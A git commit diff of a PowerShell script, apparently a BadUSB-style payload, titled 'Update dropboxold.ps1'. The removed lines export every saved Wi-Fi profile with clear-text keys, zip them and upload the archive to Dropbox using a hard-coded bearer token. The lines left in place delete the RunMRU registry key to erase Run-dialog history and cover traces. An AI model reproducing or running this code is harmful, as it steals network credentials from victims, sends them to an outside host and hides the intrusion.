d21102baf1948d022ce22df2a287286f1fe7976a
thaloot <150231781+thaloot@users.noreply.github.com>
2023-11-08 09:41:36 +0100

    Update dropboxold.ps1

--- dropboxold.ps1
+++ dropboxold.ps1
@@ -1,15 +1,2 @@
-mkdir $env:Temp\Netwerk
-netsh wlan export profile key=clear folder=$env:Temp\Netwerk
-Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
-$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
-$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + "sl.BpfDb4gzoL7GjFWNCLC9mKbzU0JXwk4sQHqwqTAUhdRK79MNzN3MALj9d4yMPw6dRAK32-2kLwPuGhf6dejPFNe6HOwlMjoVug4PLOZk769shwHK2JSaJISA7lIklRexflxi1qRGIyOA2IE"
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-rm $SourceFilePath
 $RegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 Remove-Item -Path $RegistryPath
